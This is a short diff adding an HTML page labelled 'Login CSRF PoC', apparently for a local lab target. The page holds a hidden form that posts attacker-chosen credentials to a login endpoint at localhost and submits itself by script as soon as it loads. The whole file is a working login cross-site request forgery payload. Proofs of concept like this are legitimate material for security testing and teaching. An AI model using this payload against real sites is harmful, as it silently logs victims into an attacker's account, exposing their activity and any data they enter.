@@ -1,0 +1,11 @@
+<!doctype html>
+<html>
+  <body>
+    <h3>Login CSRF PoC</h3>
+    <form id="f" action="http://localhost:8080/login.php" method="POST">
+      <input type="hidden" name="username" value="attacker_account">
+      <input type="hidden" name="password" value="attacker_password">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+  </body>
+</html>
